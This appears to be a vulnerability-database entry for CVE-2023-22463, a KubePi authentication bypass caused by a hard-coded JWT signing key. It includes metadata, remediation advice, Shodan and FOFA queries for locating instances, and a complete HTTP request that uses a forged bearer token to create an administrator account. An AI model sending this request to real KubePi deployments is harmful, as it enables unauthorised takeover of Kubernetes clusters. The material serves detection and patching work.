---
layout: "post"
cve_id: "CVE-2023-22463"
title: "KubePi JwtSigKey - Admin Authentication Bypass"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-22463.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-22463.yaml"
author: "DhiyaneshDK"
severity: "critical"
impact: "Successful exploitation of this vulnerability could lead to unauthorized access and control of the Kubernetes cluster.
"
remediation: "The vulnerability has been fixed in 1.6.3. In the patch, JWT key is specified in app.yml. If the user leaves it blank, a random key will be used. There are no workarounds aside from upgrading."
reference:
  - "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/KubePi/KubePi%20JwtSigKey%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2023-22463.md"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-22463"
  - "https://github.com/KubeOperator/KubePi/blob/da784f5532ea2495b92708cacb32703bff3a45a3/internal/api/v1/session/session.go#L35"
  - "https://github.com/KubeOperator/KubePi/commit/3be58b8df5bc05d2343c30371dd5fcf6a9fbbf8b"
  - "https://github.com/KubeOperator/KubePi/releases/tag/v1.6.3"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2023-22463', 'cwe-id': 'CWE-798', 'epss-score': 0.91521, 'epss-percentile': 0.99649, 'cpe': 'cpe:2.3:a:fit2cloud:kubepi:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'fit2cloud', 'product': 'kubepi', 'shodan-query': ['html:"kubepi"', 'http.html:"kubepi"'], 'fofa-query': ['kubepi', 'body="kubepi"']}"
tags:
  - "cve"
  - "cve2023"
  - "kubepi"
  - "k8s"
  - "auth-bypass"
  - "fit2cloud"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
KubePi is a k8s panel. The jwt authentication function of KubePi through version 1.6.2 uses hard-coded Jwtsigkeys, resulting in the same Jwtsigkeys for all online projects. This means that an attacker can forge any jwt token to take over the administrator account of any online project. Furthermore, they may use the administrator to take over the k8s cluster of the target enterprise. `session.go`, the use of hard-coded JwtSigKey, allows an attacker to use this value to forge jwt tokens arbitrarily. The JwtSigKey is confidential and should not be hard-coded in the code.


## üåê HTTP Request
```nohighlight
POST /kubepi/api/v1/users HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Content-Length: 223
Authorization: Bearer 5FQjwq9i4RZw6oRfafQR
Accept-Encoding: gzip

{
  "authenticate": {
       "password": "pYHhO2VX"
  },
  "email": "phZtjf@XIukL.com",
  "isAdmin": true,
  "mfa": {
          "enable": false
   },
  "name": "BabOGg",
  "nickName": "9DmE",
  "roles": [
  ]
}
```

